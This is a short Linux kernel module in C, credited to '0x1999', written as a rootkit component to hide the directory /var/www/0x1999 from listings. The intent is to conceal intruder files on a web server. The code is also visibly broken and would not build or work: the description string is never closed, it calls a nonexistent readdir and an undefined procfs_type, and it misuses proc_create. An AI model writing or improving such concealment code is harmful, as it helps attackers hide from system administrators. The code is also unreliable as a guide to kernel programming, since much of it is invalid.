#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0x1999");
MODULE_DESCRIPTION("Hide kernel module);

#define HIDDEN_DIRECTORY "/var/www/0x1999"

static int hide_directory_iterate(struct file *filp, struct dir_context *ctx)
{
    struct linux_dirent *dent;

    while ((dent = readdir(filp, ctx)) != NULL) {
        if (strcmp(dent->d_name, HIDDEN_DIRECTORY + 1) == 0) {
            dent->d_name[0] = '.';
            dent->d_name[1] = '.';
            dent->d_name[2] = '\0';
        }
    }

    return 0;
}

static const struct file_operations hide_directory_fops = {
    .iterate = hide_directory_iterate,
};

static int __init hide_directory_init(void)
{
    printk(KERN_INFO "Hide Directory module loaded.\n");
    
    register_filesystem(&procfs_type);
    proc_create("hide_directory", 0, NULL, &hide_directory_fops);

    return 0;
}

static void __exit hide_directory_exit(void)
{
    printk(KERN_INFO "Hide Directory module unloaded.\n");
}

module_init(hide_directory_init);
module_exit(hide_directory_exit);
